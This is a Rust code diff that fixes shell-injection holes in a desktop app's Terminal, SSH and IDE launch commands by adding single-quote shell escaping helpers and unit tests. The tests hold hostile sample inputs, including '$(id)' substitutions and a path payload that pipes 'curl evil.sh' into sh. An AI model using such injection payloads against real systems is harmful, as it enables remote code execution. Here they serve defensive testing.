@@ -36,8 +36,50 @@ fn validate_remote_host(host: &str) -> Result<(), String> {
     }
 }
 
+/// Escapes a string for embedding inside an **AppleScript double-quoted literal**. This is the
+/// outermost layer only (the one `osascript` itself parses) - it says nothing about what the shell
+/// underneath will do with the result, which is `shell_quote`'s job. Newlines are escaped too: a
+/// raw newline inside an AppleScript string literal is a syntax error, and a directory name may
+/// legally contain one on APFS.
 fn applescript_escape(s: &str) -> String {
-    s.replace('\\', "\\\\").replace('"', "\\\"")
+    s.replace('\\', "\\\\")
+        .replace('"', "\\\"")
+        .replace('\n', "\\n")
+        .replace('\r', "\\r")
+}
+
+/// Quotes `s` as ONE literal POSIX shell word. This is the single funnel every path, filename or
+/// other user-controlled string must pass through before being interpolated into a command string
+/// that a shell will parse - locally (Terminal.app / `$SHELL -ilc`) or remotely (the login shell
+/// `ssh` hands the command to).
+///
+/// Single quotes, not double: inside `"…"` the shell still honours `$`, `` ` `` and `\`, which is
+/// exactly how a directory named `it's $(id)` used to execute `id` (plan §2.2). Inside `'…'`
+/// **nothing** is special, so the only case to handle is a literal `'`, closed and reopened as
+/// `'\''`. Same semantics as the in-app terminal's `cd` helper (`usePtyTerminal.js`), kept
+/// identical on purpose so both paths behave the same for the same directory name.
+///
+/// Reusable by any other module that builds a shell string (e.g. `sync.rs`'s remote `mkdir -p`).
+pub fn shell_quote(s: &str) -> String {
+    format!("'{}'", s.replace('\'', "'\\''"))
+}
+
+/// Quotes a **remote** path for a remote shell while keeping a leading `~` / `$HOME` expandable by
+/// that shell - the one case plain `shell_quote` cannot serve, because the home directory is only
+/// known on the other end.
+///
+/// Only the leading segment is emitted unquoted (as `"$HOME"`, itself double-quoted so a home path
+/// containing spaces stays one word); everything after the first `/` is quoted literally. So a
+/// `$(…)`, backtick or quote *anywhere in the user's own text* is inert, and the sole expansion the
+/// remote shell performs is the one we deliberately asked for.
+pub fn shell_quote_remote_path(path: &str) -> String {
+    if path == "~" || path == "$HOME" {
+        return "\"$HOME\"".to_string();
+    }
+    if let Some(rest) = path.strip_prefix("~/").or_else(|| path.strip_prefix("$HOME/")) {
+        return format!("\"$HOME\"/{}", shell_quote(rest));
+    }
+    shell_quote(path)
 }
 
 /// Runs `shell_cmd` in Terminal.app via AppleScript, avoiding the double-window bug where a cold-started Terminal spawns its own default (home-dir) window at launch *and* `do script` spawns a second one for the command. When Terminal has to be launched from scratch, we reuse its freshly-created default window (`in window 1`) instead of letting `do script` open another; when Terminal is already running, behavior is unchanged (`do script` opens a new window as before).
@@ -135,12 +177,24 @@ pub fn macos_open(args: Vec<String>) -> Result<(), String> {
 }
 
 /// Opens a local Terminal window `cd`'d into `local_path`. Routed through `open_terminal_with_command` (not a plain `open -a Terminal <path>` via `macos_open`) so it gets the same cold-start double-window protection as `run_project_command`/SSH terminal.
+///
+/// `local_path` is optional (contract C-1 with the in-app terminal, which sends `null` when it cannot read the shell's cwd). Absent, empty, or the bare string `~` all mean **no `cd` at all** - the new shell then starts in `$HOME` by itself, which is what the caller wanted. Emitting `cd "~"` instead, as this used to, never worked: a tilde inside quotes is not expanded, so the window opened and immediately printed "no such file or directory".
 #[tauri::command]
-pub fn open_local_terminal(local_path: String) -> Result<(), String> {
+pub fn open_local_terminal(local_path: Option<String>) -> Result<(), String> {
     #[cfg(target_os = "macos")]
     {
-        let shell_cmd = format!("cd \"{}\"", local_path);
+        let path = local_path.unwrap_or_default();
+        let path = path.trim();
+        let shell_cmd = if path.is_empty() || path == "~" {
+            String::new()
+        } else {
+            format!("cd {}", shell_quote(path))
+        };
         open_terminal_with_command(&shell_cmd)?;
+    }
+    #[cfg(not(target_os = "macos"))]
+    {
+        let _ = local_path;
     }
     Ok(())
 }
@@ -167,12 +221,17 @@ pub fn open_remote_subprocess(ide_name: String, host: String, path: String) -> R
         "terminal" => {
             #[cfg(target_os = "macos")]
             {
-                let expanded = expand_remote_tilde(&path);
-                // Quotes here are shell quotes inside the ssh command, not AppleScript quotes  - open_terminal_with_command applies the AppleScript escaping separately.
-                let shell_cmd = format!(
-                    "ssh {} -t 'mkdir -p \"{}\" && cd \"{}\" ; exec bash'",
-                    host, expanded, expanded
-                );
+                // Two shell layers, quoted separately - the bug the old single-layer `'…"{}"…'`
+                // had was that a `'` in the path closed the outer quote and a `$(…)` inside the
+                // inner double quotes ran on the remote host.
+                // Inner: what the REMOTE login shell parses. `shell_quote_remote_path` keeps a
+                // leading `~` expandable there and freezes the rest.
+                // Outer: what the LOCAL Terminal shell parses, one `shell_quote`d argv item that
+                // ssh forwards intact. `host` is charset-validated above, so it needs no quoting.
+                // AppleScript escaping is applied separately by `open_terminal_with_command`.
+                let qpath = shell_quote_remote_path(&path);
+                let remote_cmd = format!("mkdir -p {q} && cd {q} ; exec bash", q = qpath);
+                let shell_cmd = format!("ssh {} -t {}", host, shell_quote(&remote_cmd));
                 open_terminal_with_command(&shell_cmd)?;
             }
             Ok(())
@@ -181,10 +240,14 @@ pub fn open_remote_subprocess(ide_name: String, host: String, path: String) -> R
             let expanded = expand_remote_tilde(&path);
             // Use login shell so antigravity-ide is found via user PATH (JetBrains Toolbox, custom profile setup, etc.) - not available in macOS GUI app's stripped PATH. Prefer $SHELL (zsh on macOS Catalina+) so ~/.zshrc is sourced; fall back to bash.
             let shell = std::env::var("SHELL").unwrap_or_else(|_| "/bin/bash".to_string());
-            let safe_path = expanded.replace('\'', "'\\''");
+            // Same escaping as before, now routed through the shared helper instead of an inline
+            // copy of it. The path is an argument to the CLI, not something a remote shell
+            // re-parses, so it is quoted whole (no `$HOME` carve-out).
             let shell_cmd = format!(
-                "{}exec \"$AGY_BIN\" --remote 'ssh-remote+{}' '{}'",
-                AGY_BIN_RESOLVER_PREFIX, host, safe_path
+                "{}exec \"$AGY_BIN\" --remote 'ssh-remote+{}' {}",
+                AGY_BIN_RESOLVER_PREFIX,
+                host,
+                shell_quote(&expanded)
             );
             // -ilc: interactive (-i) sources ~/.zshrc (not just ~/.zprofile); login (-l) sources ~/.zprofile. Both needed because antigravity-ide PATH is typically set in ~/.zshrc, which a non-interactive login shell (-lc) never reads - causing silent failure when the app launches from Finder vs. from a terminal that already inherited full PATH.
             Command::new(&shell)
@@ -276,7 +339,7 @@ pub fn install_akiclaudedoc() -> Result<(), String> {
     match find_akiclaudedoc_install_script(&home) {
         #[cfg(target_os = "macos")]
         Some(script) => {
-            let shell_cmd = format!("bash \"{}\"", script);
+            let shell_cmd = format!("bash {}", shell_quote(&script));
             open_terminal_with_command(&shell_cmd)
         }
         #[cfg(not(target_os = "macos"))]
@@ -400,11 +463,15 @@ pub async fn resolve_remote_path(host: String, path: String) -> Result<String, S
 
     // The SSH round-trip is blocking IO. This command used to be a plain `pub fn`, so Tauri ran it on the main thread and the whole UI froze for the duration of the network call. Move it onto the blocking pool (CLAUDE.md "async fn + blocking subprocess" pitfall) so the UI stays responsive while the resolve is in flight.
     tauri::async_runtime::spawn_blocking(move || {
-        let expanded = expand_remote_tilde(&path);
-
         let mut command = create_command("ssh");
-        // Pass the command as a single argument so SSH passes it intact to the remote shell. Otherwise SSH concatenates multiple args with spaces and `bash -c` gets split.
-        let script = format!("bash -c \"echo {}\"", expanded);
+        // Three shells parse this in turn, so it is quoted three times over, innermost first:
+        //   1. `shell_quote_remote_path` - only a leading `~`/`$HOME` stays expandable; the rest of
+        //      the user's path is literal, so a `$(…)` in it can no longer execute ON THE SERVER
+        //      (the old `bash -c "echo {}"` interpolated it raw inside double quotes).
+        //   2. `shell_quote` of the whole `echo …` - what `bash -c` receives as one argument.
+        //   3. one argv item to ssh, so ssh forwards it intact instead of splitting on spaces.
+        let echo_cmd = format!("echo {}", shell_quote_remote_path(&path));
+        let script = format!("bash -c {}", shell_quote(&echo_cmd));
         command.args([&host, &script]);
 
         let output = command
@@ -575,7 +642,10 @@ pub fn check_project_stack(local_path: String) -> ProjectStackInfo {
 /// Opens a Terminal window `cd`'d into `local_path` running `cmd`. Shared by `run_project_command` (BUILD) and `run_project_dev` (DEV) so the terminal-launch line is not duplicated between them.
 #[cfg(target_os = "macos")]
 fn run_in_project_terminal(local_path: &str, cmd: &str) -> Result<(), String> {
-    let shell_cmd = format!("cd \"{}\" && {}", local_path, cmd);
+    // `local_path` is user-typed free text, so it is quoted. `cmd` is NOT: it is the app-built
+    // command line from `check_project_stack` (`npm run build:app`, …) and must stay parseable as
+    // a command, not collapse into one literal word.
+    let shell_cmd = format!("cd {} && {}", shell_quote(local_path), cmd);
     open_terminal_with_command(&shell_cmd)
 }
 
@@ -674,5 +744,90 @@ mod tests {
     #[test]
     fn applescript_escape_tilde_path() {
         assert_eq!(applescript_escape("$HOME/app"), "$HOME/app");
+    }
+
+    #[test]
+    fn applescript_escape_newline() {
+        // A raw newline would end the AppleScript string literal mid-statement.
+        assert_eq!(applescript_escape("a\nb"), "a\\nb");
+    }
+
+    #[test]
+    fn shell_quote_plain_path() {
+        assert_eq!(shell_quote("/Users/aki/app"), "'/Users/aki/app'");
+    }
+
+    #[test]
+    fn shell_quote_space() {
+        assert_eq!(shell_quote("/Users/aki/my app"), "'/Users/aki/my app'");
+    }
+
+    #[test]
+    fn shell_quote_single_quote() {
+        // The one character that needs work: close, escaped literal, reopen.
+        assert_eq!(shell_quote("it's"), "'it'\\''s'");
+    }
+
+    #[test]
+    fn shell_quote_double_quote() {
+        assert_eq!(shell_quote("say \"hi\""), "'say \"hi\"'");
+    }
+
+    #[test]
+    fn shell_quote_command_substitution() {
+        assert_eq!(shell_quote("/tmp/$(id)"), "'/tmp/$(id)'");
+    }
+
+    #[test]
+    fn shell_quote_backtick() {
+        assert_eq!(shell_quote("/tmp/`id`"), "'/tmp/`id`'");
+    }
+
+    #[test]
+    fn shell_quote_backslash() {
+        // Inside single quotes a backslash is literal - it must NOT be doubled.
+        assert_eq!(shell_quote("a\\b"), "'a\\b'");
+    }
+
+    #[test]
+    fn shell_quote_unicode() {
+        assert_eq!(shell_quote("/Users/aki/Tài liệu"), "'/Users/aki/Tài liệu'");
+    }
+
+    #[test]
+    fn shell_quote_injection_attempt_stays_one_word() {
+        // The exact payload from plan §2.2: everything after the first `"` used to be executed.
+        let quoted = shell_quote("/tmp/x\"; curl evil.sh | sh; :\"");
+        assert_eq!(quoted, "'/tmp/x\"; curl evil.sh | sh; :\"'");
+        // No unescaped quote can terminate the word early.
+        assert!(!quoted[1..quoted.len() - 1].contains("'"));
+    }
+
+    #[test]
+    fn shell_quote_remote_path_expands_bare_tilde() {
+        assert_eq!(shell_quote_remote_path("~"), "\"$HOME\"");
+        assert_eq!(shell_quote_remote_path("$HOME"), "\"$HOME\"");
+    }
+
+    #[test]
+    fn shell_quote_remote_path_keeps_tilde_prefix_expandable() {
+        assert_eq!(shell_quote_remote_path("~/www/site"), "\"$HOME\"/'www/site'");
+        assert_eq!(shell_quote_remote_path("$HOME/www/site"), "\"$HOME\"/'www/site'");
+    }
+
+    #[test]
+    fn shell_quote_remote_path_quotes_absolute_path() {
+        assert_eq!(shell_quote_remote_path("/srv/my app"), "'/srv/my app'");
+    }
+
+    #[test]
+    fn shell_quote_remote_path_freezes_substitution_after_tilde() {
+        // Only the leading `~` expands; a `$(…)` later in the path must not.
+        assert_eq!(shell_quote_remote_path("~/$(id)"), "\"$HOME\"/'$(id)'");
+    }
+
+    #[test]
+    fn shell_quote_remote_path_handles_quote_after_tilde() {
+        assert_eq!(shell_quote_remote_path("~/it's"), "\"$HOME\"/'it'\\''s'");
     }
 }
